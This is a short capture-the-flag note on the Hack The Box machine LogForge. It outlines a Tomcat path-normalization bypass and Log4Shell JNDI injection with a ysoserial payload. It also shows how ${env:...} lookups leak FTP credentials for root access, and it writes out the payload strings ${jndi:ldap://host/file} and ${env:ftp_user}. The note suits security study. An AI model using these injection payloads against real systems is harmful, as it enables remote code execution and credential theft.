---
type: machine
title: LogForge
platform: htb
os: linux
difficulty: medium
tags: [linux, web, java, ldap, privesc, log4j]
solved: 2026-07-09
sources: [[htb-logforge]]
related: []
---

# LogForge
> Linux UHC box focused on Log4j exploitation with Orange Tsai path bypass for Tomcat manager access, JNDI LDAP injection for initial shell, and Log4Shell again to leak FTP credentials from environment variables.

## Attack path
1. [[orange-tsai]] — path normalization bypass to access Tomcat manager from localhost
2. [[log4shell]] — JNDI LDAP injection via ysoserial CommonsCollections5 payload
3. [[environment-variable-leak]] — Log4Shell on FTP username to leak ftp_user and ftp_password
4. [[ftp]] — leaked credentials grant FTP access as root for flag and su to root

## Techniques used
- [[orange-tsai]] — /0xdf/..;/manager/ path bypass for Apache hosting Tomcat
- [[log4shell]] — CVE-2021-44228 JNDI injection via ${jndi:ldap://host/file}
- [[jndi-injection]] — LDAP server serving serialized Java payload for code execution
- [[ldap-injection]] — abusing LDAP protocol to exfiltrate environment variables
- [[environment-variable-leak]] — ${env:ftp_user} in JNDI string leaks credentials
- [[log4j]] — Java logging library vulnerable to JNDI string injection
- [[reverse-engineering]] — decompiled Java FTP server to identify Log4j usage

## Tools used
[[nmap]], feroxbuster, [[curl]], java, ysoserial, JNDI-Exploit-Kit, jd-gui, tcpdump, nc

## Services / ports
- [[ssh]] (22)
- [[http]] (80) — Apache hosting Tomcat
- [[ftp]] (21) — filtered, listening on localhost only
- [[http-proxy]] (8080) — filtered, Tomcat alternate port

## Lessons / notes
- Orange Tsai path normalization bypass works when Apache proxies Tomcat (..; terminates Apache path)
- Log4Shell affects any application using Log4j for logging, not just web servers
- ysoserial CommonsCollections5 gadget chain works on this Java version
- JNDI strings can exfiltrate environment variables via ${env:VARNAME} in LDAP path
- Modified ysoserial supports complex commands via Runtime.getRuntime().exec(String[].class)
- LDAP protocol can be inspected with nc and xxd for exploitation debugging
- Java-based FTP servers using Log4j are vulnerable to username-based JNDI injection
